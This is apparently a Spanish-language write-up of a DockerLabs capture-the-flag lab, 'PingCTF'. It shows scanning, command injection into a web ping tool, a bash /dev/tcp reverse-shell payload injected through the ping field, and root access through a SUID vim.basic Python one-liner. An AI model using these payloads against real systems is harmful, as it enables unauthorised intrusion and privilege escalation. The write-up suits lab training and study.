---
icon: flag
---

# PingCTF DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip pingctf.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh pingctf.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 03:12 EDT
Nmap scan report for packer.pw (172.17.0.2)
Host is up (0.000050s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Ping
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

Veremos simplemente un puerto `80` en el que aloja una pagina web, si entramos dentro veremos una pagina en la que es una herramienta de `ping` dejandote realizar un `ping` hacia una `IP` o `dominio` ya estaremos viendo cosas interesantes, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

Si probamos a concatenar comandos de esta forma:

```
127.0.0.1; ls
```

Info:

```
index.html
ping.php
```

## Escalate user www-data

Vemos que funciona, por lo que vamos a probar a realizar una `reverse shell` de esta forma:

```
127.0.0.1; bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
```

Ahora si nos ponemos a la escucha antes de enviar el comando.

```shell
nc -lvnp <PORT>
```

Cuando enviemos el comando, si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 60564
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@9c4611d5ea26:/var/www/html$ whoami
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos en el sistema veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
3699283     56 -rwsr-xr-x   1 root     root        55680 Dec  5  2024 /usr/bin/su
  3699075     72 -rwsr-xr-x   1 root     root        72792 May 30  2024 /usr/bin/chfn
  3699206     40 -rwsr-xr-x   1 root     root        40664 May 30  2024 /usr/bin/newgrp
  3699142     76 -rwsr-xr-x   1 root     root        76248 May 30  2024 /usr/bin/gpasswd
  3699217     64 -rwsr-xr-x   1 root     root        64152 May 30  2024 /usr/bin/passwd
  3699309     40 -rwsr-xr-x   1 root     root        39296 Dec  5  2024 /usr/bin/umount
  3699201     52 -rwsr-xr-x   1 root     root        51584 Dec  5  2024 /usr/bin/mount
  3699081     44 -rwsr-xr-x   1 root     root        44760 May 30  2024 /usr/bin/chsh
  3717295   4032 -rwsr-xr-x   1 root     root      4126400 Apr  1 20:12 /usr/bin/vim.basic
```

Vemos la ultima linea bastante interesante:

```
3717295   4032 -rwsr-xr-x   1 root  root  4126400 Apr  1 20:12 /usr/bin/vim.basic
```

Sabemos que en los sistema de `Linux` los puntos no establecen la extension en el sistema como en `Windows` por lo que eso funciona como `Vim` y tiene permisos `SUID`, pero en este caso da algunos errores los cuales dificultan el poder explotar algo.

Si probamos de esta forma:

```shell
/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
```

Info:

```
.............................<RESTO_DE_CODIGO>.....................................
E79: Cannot expand wildcards


E79: Cannot expand wildcards
bash-5.2# whoami
root
```

Veremos que con esto seremos `root`, por lo que habremos terminado la maquina.
